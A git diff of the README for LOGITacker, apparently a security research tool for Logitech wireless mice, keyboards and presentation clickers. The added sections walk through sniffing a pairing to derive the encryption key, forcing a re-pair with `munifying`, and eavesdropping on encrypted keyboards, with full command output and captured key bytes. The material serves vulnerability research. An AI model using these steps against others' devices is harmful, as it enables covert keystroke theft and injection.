@@ -1,6 +1,6 @@
 # LOGITacker
 
-**REAMDE is still under construction**
+**README is still under construction**
 
 LOGITacker is a hardware tool to enumerate and test vulnerabilities of Logitech Wireless Input devices via RF.
 In contrast to available tooling, it is designed as stand-alone tool. This means not only the low level RF part, 
@@ -411,7 +411,7 @@ For Logitech devices vulnerable to plain keystroke injection (see MouseJack rese
 directly be used. For encrypted devices, like Logitech R500 or Logitech SPOTLIGHT presentation clickers, the new script 
 can not be injected, without knowing the encryption key. This is issue is covered in the next section.
 
-## Encrypted injection, based on scripts
+## Encrypted injection
 
 In order to execute the example scripts agains an encrypted Logitech device, the decryption key has to be obtained.
 There are two class of vulnerabilities, allow stealing those keys:
@@ -424,8 +424,9 @@ the device pairing. The scripts of the last section have been built to target wi
 or SPOTLIGHT. When those devices ship, they are already paired to the receiver. This is less of an issue, as an 
 undocumented pairing mode could be triggered, anyways.
 
-The following video shows the concept: 
-**ADD MISSING VIDEO AND LINK TO MUNIFYING HERE**
+The following video shows the concept: https://youtu.be/MauTMsyphUE 
+
+The pre-release version of munifying could be found here: https://github.com/mame82/munifying_pre_release
 
 The only thing which has to be done to capture a pairing with LOGITacker and derive the link encryption key according to
 CVE-2019-13052, is to issue the following command: `pair sniff run`
@@ -434,36 +435,153 @@ LOGITacker starts flashing the red LED. Once a receiver - which is set to pairin
 flashing blue. If a pairing is captured successfully, the device and associated key are not only stored in LOGITacker's
 RAM, but they are automatically stored to flash.
 
-In order to unpair and re-pair the device to the receiver, the `munifying` tool is used, while LOGITacker is running in 
-`pair sniff run` mode.
+In order to unpair and re-pair the device to the receiver, the `munifying` tool is used. Re-pairing of the device is
+done, while LOGITacker is running in `pair sniff` mode.
 
 The command `./munifying unpair` lists devices currently paired to the receiver and ask for a device to unpair.
-To set the receiver back to pairing mode and re-pair the device, munifying has to be started like this:
-`./munifying pair`. At this point the red-flashing LED of LOGITacker should turn to a blue-flashing LED.
+To set the receiver back to pairing mode and re-pair the device, munifying has to be called with `./munifying pair`. 
+
+Below is the example output of `munifying` for unpairing a R500 presenation clicker from its receiver and initiating 
+pairing mode again.
+
+```
+root@who-knows:~# ./munifying unpair
+Found CU0016 Dongle for R500 presentation clicker
+Using dongle USB config: Configuration 1
+Resetting dongle in order to release it from kernel (connected devices won't be usable)
+HID++ interface: vid=046d,pid=c540,bus=3,addr=56,config=1,if=2,alt=0
+HID++ interface IN endpoint: ep #3 IN (address 0x83) interrupt - undefined usage [32 bytes]
+Dongle Info
+-------------------------------------
+	Firmware (maj.minor.build):  RQR45.00.B0002
+	Bootloader (maj.minor):      02.09
+	WPID:                        8808
+	(likely) protocol:           0x04
+	Serial:                      01:89:97:e6
+	Connected devices:           1
+
+Device Info for device index index 0
+-------------------------------------
+	Destination ID:              0x23
+	Default report interval:     8ms
+	WPID:                        407a
+	Device type:                 0x04 (PRESENTER)
+	Serial:                      a7:a4:a0:69
+	Report types:                0000000e (Report types: keyboard mouse multimedia )
+	Capabilities:                01 (not Unifying compatible, link encryption enabled)
+	Usability Info:              0x0f (reserved)
+	Name:                        Logi R500
+	RF address:                  01:89:97:e6:23
+	KeyData:                     **pre-release REDACTED**
+	Key:                         **pre-release REDACTED**
+
+Devices connected to target dongle, select device to unpair...
+1) 01:89:97:e6:23 PRESENTER 'Logi R500'
+choose device to unpair: 1
+Remove device index 0 'Logi R500' from paired devices
+USB Report type: HID++ short message, DeviceID: 0x01, SubID: DEVICE DISCONNECTION, Params: 0x02 0x00 0x00 0x00
+	Device disconnected: true
+USB Report type: DJ Report short, DeviceID: 0x01, DJ Type: NOTIFICATION DEVICE UNPAIRED, Params: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
+USB Report type: HID++ short message, DeviceID: 0xff, SubID: SET REGISTER SHORT, Params: 0xb2 0x00 0x00 0x00
+	Register address: REGISTER PAIRING
+	Value: 0x00 0x00 0x00
+Closing Logitech Receiver dongle...
+
+root@who-knows:~# ./munifying pair
+Found CU0016 Dongle for R500 presentation clicker
+Using dongle USB config: Configuration 1
+Resetting dongle in order to release it from kernel (connected devices won't be usable)
+HID++ interface: vid=046d,pid=c540,bus=3,addr=56,config=1,if=2,alt=0
+HID++ interface IN endpoint: ep #3 IN (address 0x83) interrupt - undefined usage [32 bytes]
+Enable pairing for 60 seconds
+USB Report type: HID++ short message, DeviceID: 0xff, SubID: SET REGISTER SHORT, Params: 0xb2 0x00 0x00 0x00
+	Register address: REGISTER PAIRING
+	Value: 0x00 0x00 0x00
+... Enable pairing response (should be enabled)
+
+Printing follow up reports ...
+```
+
+Once the receiver is in pairing mode, the red-flashing LED of LOGITacker should turn to a blue-flashing LED.
 For Unifying devices, the device which should be paired has to be turned off and on again. For presentation clickers
 R500 / SPOTLIGHT the two buttons used to put the clicker into Bluetooth mode have to pressed and hold.
 
-If nothing has gone wrong, LOGITacker has captured the device address and encryption key and automatically toggled back
-from "pair sniff" mode to "passive-enum" mode (default behavior). When pressing keys on the - now paired - device, 
-LOGITacker should not only print the encrypted reports, but a decrypted version, too.
+If nothing has gone wrong, LOGITacker has captured the device address and encryption key. Afterwards, LOGITacker
+changes back from "pair sniff" mode to "passive-enum" mode (default behavior). 
+
+Here's some example output of a successful key capture:
+
+```
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 44 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 74 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 5 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: dongle on channel 5 
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF data received on channel 5
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  D6 1F 01 01 89 97 E6 24|.......$
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  08 88 08 04 01 04 01 00|........
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  00 00 00 00 00 3D      |.....=  
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF assigned 01:89:97:E6:24 as new sniffing address
+...snip...
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:                         |        
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF data received on channel 5
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  00 40 03 01 BC         |.@...   
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: PAIR SNIFF data received on channel 5
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  00 0F 06 02 03 F8 74 A7|......t.
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF:  A4 2F                  |./      
+<info> LOGITACKER_PAIRING_PARSER: Device name: Logi R500
+<info> LOGITACKER_PAIRING_PARSER: Device RF address: 01:89:97:E6:25
+<info> LOGITACKER_PAIRING_PARSER: Device serial: A7:A4:A0:69
+<info> LOGITACKER_PAIRING_PARSER: Device WPID: 0x407A
+<info> LOGITACKER_PAIRING_PARSER: Device report types: 0x0000000E
+<info> LOGITACKER_PAIRING_PARSER: Device usability info: 0x0F
+<info> LOGITACKER_PAIRING_PARSER: Dongle WPID: 0x8808
+<info> LOGITACKER_PAIRING_PARSER: Device caps: 0x01
+<info> LOGITACKER_PAIRING_PARSER: Device report types: 0x0000000E
+<info> LOGITACKER_PAIRING_PARSER: Device raw key material:
+<info> LOGITACKER_PAIRING_PARSER:  01 89 97 E6 40 7A 88 08|....@z..
+<info> LOGITACKER_PAIRING_PARSER:  52 62 64 53 18 9E F8 74|RbdS...t
+<info> LOGITACKER_PAIRING_PARSER: Device key:
+<info> LOGITACKER_PAIRING_PARSER:  08 76 01 E6 64 68 37 F8|.v..dh7.
+<info> LOGITACKER_PAIRING_PARSER:  52 88 E7 7A 9E 21 40 53|R..z.!@S
+<info> LOGITACKER_FLASH: FDS_EVENT_WRITE
+<info> LOGITACKER_FLASH: Record ID:     0x00CA
+<info> LOGITACKER_FLASH: File ID:       0x1001
+<info> LOGITACKER_FLASH: Record key:    0x1001
+<info> LOGITACKER_SCRIPT_ENGINE: FDS event handler for scripting: IDLE ... ignoring event
+<info> LOGITACKER_FLASH: dongle which should be stored to flash exists, updating ...
+<info> LOGITACKER_SCRIPT_ENGINE: FDS event handler for scripting: IDLE ... ignoring event
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: device automatically stored to flash
+<info> LOGITACKER_PROCESSOR_PAIR_SNIFF: Sniffed full pairing, moving on with passive enumeration for 01:89:97:E6:25
+<info> LOGITACKER_RADIO: Channel hopping stopped
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Entering passive enumeration mode for address 01:89:97:E6:25
+... snip ...
+```
+
+When pressing keys on the - now paired - device, 
+LOGITacker should not only print the encrypted reports, but a decrypted version, too (in passive-enum mode).
 
 Here's an example for the key "RIGHT":
 
 ```
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: frame RX in passive enumeration mode (addr AE:C7:93:48:36, len: 22, ch idx 9, raw ch 32)
-<info> app: Unifying RF frame: Encrypted keyboard, counter F07F617A                <<-- encrypted frame
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 D3 26 3F AC BC 7F 49|..&?...I
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  98 AC F0 7F 61 7A 00 00|....az..
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 0A      |......  
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: frame RX in passive enumeration mode (addr 01:89:97:E6:25, len: 22, ch idx 9, raw ch 32)
+<info> app: Unifying RF frame: Encrypted keyboard, counter BD8A4B14                <<-- encrypted frame
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 D3 1B 9B 99 17 CA 64|.......d
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  3E 4A BD 8A 4B 14 00 00|>J..K...
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 6B      |.....k  
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Test decryption of keyboard payload:
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 4F 00 00 00 00 00 C9|.O......
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Mod: NONE
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Key 1: HID_KEY_RIGHT                     <<-- decrypted key press "RIGHT" (only if AES key known)
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: frame RX in passive enumeration mode (addr AE:C7:93:48:36, len: 22, ch idx 9, raw ch 32)
-<info> app: Unifying RF frame: Encrypted keyboard, counter F07F617B               <<-- encrypted frame
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 D3 79 2F 7F 87 BD 6C|..y/...l
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  1F 8D F0 7F 61 7B 00 00|....a{..
-<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 5F      |....._  
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM: frame RX in passive enumeration mode (addr 01:89:97:E6:25, len: 22, ch idx 9, raw ch 32)
+<info> app: Unifying RF frame: Encrypted keyboard, counter BD8A4B15               <<-- encrypted frame
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 D3 E4 FB CE 17 E2 95|........
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  53 C8 BD 8A 4B 15 00 00|S...K...
+<info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 30      |.....0  
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Test decryption of keyboard payload:
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM:  00 00 00 00 00 00 00 C9|........
 <info> LOGITACKER_PROCESSOR_PASIVE_ENUM: Mod: NONE                                <<-- decrypted key release (only if AES key known)
@@ -510,8 +628,62 @@ LOGITacker (injection) $ options inject onsuccess continue
 LOGITacker (injection) $ options store 
 ```
 
+## Eavesdropping encrypted keyboards
 
-# Video usage examples (Twitter)
+The process for eavesdropping follows the same steps as described for the "encrypted injection".
+
+The link encryption key for a device has either to be added manually (could be extracted from receivers with unrestricted
+version of `munifying`, once released) or to be obtained from sniffing of device pairing.
+
+As pointed out in the previous chapter, passive-enum automatically decrypts received key reports for devices with known
+key. Reading the keys from the CLI output isn't really convenient. To overcome this, LOGITacker allows forwarding of
+decrypted or plain keyboard and mouse frames sniffed in passive-enum mode to its USB interface. The reports are 
+translated to proper USB HID reports. Thus, the input is ultimately mirrored to the USB host which has LOGITacker 
+connected.
+
+The respective options could be enabled with the following commands:
+
+```
+LOGITacker (passive enum) $ options passive-enum pass-through-mouse on
+passive-enum USB mouse pass-through: on
+LOGITacker (passive enum) $ options passive-enum pass-through-keyboard on
+passive-enum USB keyboard pass-through: on   
+```
+
+The result should look like in the following video, where the sniffed input of a encrypted keyboard is mirrored to 
+LOGITacker's USB host: https://youtu.be/GRJ7i2J_Y80
+
+The video additionally shows, that for Unifying device the re-pairing could be initiated using the Unifying software, in
+order to sniff the link encryption key. For presentation clickers, this could currently only be achieved with `munifying`.
+
+
+**WARNING: In current version, no filter could be applied on USB forwarded input. Everything entered with the sniffed
+keyboard is directly forwarded to the USB keyboard interface of LOGITacker.**
+
+## Format description for RF reports forwarded to raw USB HID interface
+
+t.b.d.
+
+```
+typedef struct {
+    logitacker_devices_unifying_device_rf_address_t rf_address;
+    uint8_t pid;
+    uint8_t rf_channel;
+    int8_t rssi;
+    uint8_t payload_length;
+    uint8_t payload_data[32]; //maximum of 32 bytes (we ignore capabilities of newer nRF5 series, as it doesn't apply to Logitech devices)
+
+} logitacker_usb_hidraw_rf_frame_representation_t;
+```
+
+## Headless use / Automation 
+
+t.b.d.
+
+Demo: https://youtu.be/nMoaXDQJNZ8
+
+
+# Other vVideo usage examples (Twitter)
 
 Note: The videos have been created throughout development and command syntax has likely changed (and will change). 
 Please use tab completion and CLI inline help. All examples are included in current firmware.
@@ -576,14 +748,16 @@ To set a script as default script on boot (could be used for auto-injection), th
 Video demo 1 (Mouse MX Anywhere 2S): https://twitter.com/mame82/status/1139671585042915329
 
 Video demo 2 (encrypted presentation clicker R500): https://twitter.com/mame82/status/1143093313924452353
-
-
-# Further CLI documentation
-
-t.b.d.
-
-use issues for questions
   
 # DISCLAIMER
 
-**ToDo**
+**LOGITacker** should be used for authorized testing and/or educational purposes only. 
+The only exception is using it against devices or a network, owned by yourself.
+
+I take no responsibility for the abuse of LOGITacker or any information given in
+the related documents. 
+
+**I DO NOT GRANT PERMISSIONS TO USE LOGITacker TO BREAK THE LAW.**
+
+As LOGITacker is no production tool, it is likely that bugs occur.
+I disclaim any warranty for LOGITacker, it is provided "as is".
